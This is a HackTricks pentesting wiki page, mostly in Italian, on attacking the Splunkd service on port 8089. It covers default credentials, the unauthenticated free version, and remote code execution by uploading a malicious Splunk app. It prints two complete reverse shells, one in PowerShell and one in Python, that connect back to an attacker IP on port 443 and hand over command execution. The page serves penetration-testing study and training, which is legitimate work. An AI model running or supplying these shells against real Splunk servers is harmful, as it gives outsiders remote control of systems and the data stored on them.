# 8089 - Pentesting Splunkd

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


## **Informazioni di base**

* Strumento di analisi dei log utilizzato per la raccolta, analisi e visualizzazione dei dati
* Comunemente usato nel monitoraggio della sicurezza e nell'analisi aziendale
* Porte predefinite:
* Server web: 8000
* Servizio Splunkd: 8089

### Vettori di vulnerabilit√†:

1. Sfruttamento della versione gratuita

* La versione di prova si converte automaticamente in versione gratuita dopo 60 giorni
* La versione gratuita manca di autenticazione
* Potenziale rischio per la sicurezza se lasciata non gestita
* Gli amministratori potrebbero trascurare le implicazioni di sicurezza

2. Debolezze delle credenziali

* Versioni pi√π vecchie: Credenziali predefinite `admin:changeme`
* Versioni pi√π recenti: Credenziali impostate durante l'installazione
* Potenziale utilizzo di password deboli (es. `admin`, `Welcome`, `Password123`)

3. Opportunit√† di esecuzione di codice remoto

* Molti metodi di esecuzione del codice:
* Applicazioni Django lato server
* Endpoint REST
* Input scriptati
* Script di allerta
* Supporto multipiattaforma (Windows/Linux)
* Gli input scriptati possono eseguire:
* Script Bash
* Script PowerShell
* Script Batch

Potenziale di sfruttamento chiave:

* Archiviazione di dati sensibili
* Mancanza di autenticazione nella versione gratuita
* Molti vettori per potenziale esecuzione di codice remoto
* Possibilit√† di sfruttare input scriptati per compromettere il sistema

### Shodan

* `Splunk build`

## RCE

### Crea un'applicazione personalizzata

Splunk offre un metodo sofisticato per l'esecuzione di codice remoto attraverso il deployment di applicazioni personalizzate, sfruttando le sue capacit√† di scripting multipiattaforma. La tecnica di sfruttamento principale ruota attorno alla creazione di un'applicazione malevola che pu√≤ eseguire reverse shell su sistemi Windows e Linux.

Un'applicazione personalizzata pu√≤ eseguire **script Python, Batch, Bash o PowerShell**. Inoltre, **Splunk viene fornito con Python installato**, quindi anche nei sistemi **Windows** sar√† possibile eseguire codice Python.

Puoi utilizzare [**questo**](https://github.com/0xjpuff/reverse_shell_splunk) esempio con il **`bin`** contenente esempi per [Python](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py) e [PowerShell](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1). Oppure potresti creare il tuo.

Il processo di sfruttamento segue una metodologia coerente tra le piattaforme:
```
splunk_shell/
‚îú‚îÄ‚îÄ bin        (reverse shell scripts)
‚îî‚îÄ‚îÄ default    (inputs.conf configuration)
```
Il file di configurazione critico `inputs.conf` abilita lo script:

* Impostando `disabled = 0`
* Configurando un intervallo di esecuzione di 10 secondi
* Definendo il tipo di sorgente dello script

Il deployment √® semplice:

1. Crea il pacchetto dell'applicazione malevola
2. Imposta un listener (Netcat/socat) sulla macchina attaccante
3. Carica l'applicazione tramite l'interfaccia di Splunk
4. Attiva l'esecuzione automatica dello script al momento del caricamento

Esempio di reverse shell di Windows PowerShell:
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()
};
$client.Close()
```
Esempio di reverse shell Python su Linux:
```python
import sys, socket, os, pty
ip = "10.10.14.15"
port = "443"
s = socket.socket()
s.connect((ip, int(port)))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
pty.spawn('/bin/bash')
```
### RCE & Escalation dei privilegi

Nella pagina seguente puoi trovare una spiegazione su come questo servizio pu√≤ essere abusato per escalare i privilegi e ottenere persistenza:

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## Riferimenti

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

{% hint style="success" %}
Impara e pratica Hacking AWS:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica Hacking GCP: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.

</details>
{% endhint %}
